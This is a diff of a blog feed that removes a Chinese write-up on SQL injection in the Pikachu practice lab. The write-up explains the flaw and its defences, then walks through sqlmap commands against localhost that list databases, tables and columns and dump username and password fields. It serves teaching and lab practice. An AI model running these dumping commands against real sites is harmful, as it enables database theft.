@@ -27,29 +27,6 @@
   
   
   <entry>
-    <title>pikachu-SQL注入</title>
-    <link href="/2022/08/11/%E6%96%B0%E6%96%87%E6%A1%A3/"/>
-    <url>/2022/08/11/%E6%96%B0%E6%96%87%E6%A1%A3/</url>
-    
-    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>数据库注入漏洞</p><p>SQL注入漏洞形成原因：在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到sql语句中后，被当作sql语句的一部分执行，从而导致数据库受损（被脱库、被删除、甚至整个服务器权限沦陷）防止SQL注入漏洞的策略：</p><p>1、对传进SQL语句里面的变量进行过滤，不允许危险字符传入</p><p>2、使用参数化（Parameterized Query 或 Parameterized Statement）</p><h1 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h1><p><img src="https://s2.loli.net/2022/08/11/OxedYC8Z3TW6mhi.png" alt="图片.png"></p><p>随便提交，抓包可知，是post方式提交的参数为</p><pre><code class="hljs">id=2&amp;submit=%E6%9F%A5%E8%AF%A2</code></pre><p>使用sqlmap跑post方式时的格式为：</p><pre><code class="hljs">python2 sqlmap.py ‐u "&lt;url&gt;" ‐‐data="&lt;post提交的参数&gt;" ‐&lt;参数&gt;</code></pre><p>1、使用sqlmap跑数据库</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐‐dbs ‐‐batch</code></pre><p>注释：</p><ul><li>‐‐dbms 探测数据库是什么 ‐‐dbms mysql 指定数据库类型为mysql数据库</li><li>‐‐dbs 当用户有权读取时，列出所有的数据库</li><li>‐‐batch 该参数使用后不需要用户输入，将会使用sqlmap给的默认提示走下去</li></ul><p><img src="https://s2.loli.net/2022/08/11/OcN91PyeLSb6dZ2.png" alt="图片.png"></p><p>2、查数据库pikachu下的表</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐D pikachu ‐‐tables ‐‐batch</code></pre><p>注释：</p><ul><li>‐D pikachu 指定数据库pikachu</li><li>‐‐tables 当有权限读取pikachu数据库中的表tables时，读取出表</li></ul><p><img src="https://s2.loli.net/2022/08/11/Z5tUei9paG8COwq.png" alt="图片.png"></p><p>3、获取表users中的列</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐D pikachu ‐T users ‐‐columns ‐‐batch</code></pre><p>注释：</p><ul><li>‐T users 指定表明users</li><li>‐‐colmns 当有权限读取表users中的列的时候读取表users中的列。</li><li><img src="https://s2.loli.net/2022/08/11/HGPmW5npascRi78.png" alt="图片.png"></li></ul><p>4、获取列username和password中的字段内容</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐D pikachu ‐T users ‐C username,password ‐‐dump ‐‐batch</code></pre><p>注释：</p><ul><li>‐C username,password 指定读取列username和password中的字段内容</li><li>‐‐dump 抛出前面指定内容</li></ul><p><img src="https://s2.loli.net/2022/08/11/gzPAj4DCbM7aeX5.png" alt="图片.png"></p><h1 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h1><p>1、提交，抓包</p><p>2、提交恒等语句可以查询到所有的数据信息</p><p><img src="https://s2.loli.net/2022/08/11/Mb1gFvQZJKzuoPj.png" alt="图片.png"></p><h1 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h1><p><img src="https://s2.loli.net/2022/08/11/1woM6UtT2yZej4v.png" alt="图片.png"></p><p><img src="https://s2.loli.net/2022/08/11/zGdbRT8eLB5uE2q.png" alt="图片.png"></p><p>GET方法取表，抓包：</p><p><img src="https://s2.loli.net/2022/08/11/YCWcI9t8lphZfLj.png" alt="图片.png"></p><p>参数返回：<code> GET /pikachu/vul/sqli/sqli_str.php?name=&amp;submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1</code></p><p>使用sqlmap跑：</p><p>1、查数据库</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" ‐‐dbms mysql ‐‐dbs </code></pre><p><img src="https://s2.loli.net/2022/08/11/oMtHBAC7XWPq5Os.png" alt="图片.png"></p><p>2、查表</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" ‐‐dbms mysql ‐D pikachu</code></pre><p><img src="https://s2.loli.net/2022/08/11/e9CPAYrHTNyW7fg.png" alt="图片.png"></p><p>3、查列</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" ‐‐dbms mysql ‐D pikachu</code></pre><p><img src="https://s2.loli.net/2022/08/11/jImLuBZw6kV9oHe.png" alt="图片.png"></p>]]></content>
-    
-    
-    
-    <tags>
-      
-      <tag>pikachu</tag>
-      
-      <tag>WEB</tag>
-      
-      <tag>SQL注入</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>pikachu-RCE</title>
     <link href="/2022/08/11/pikachu-RCE/"/>
     <url>/2022/08/11/pikachu-RCE/</url>
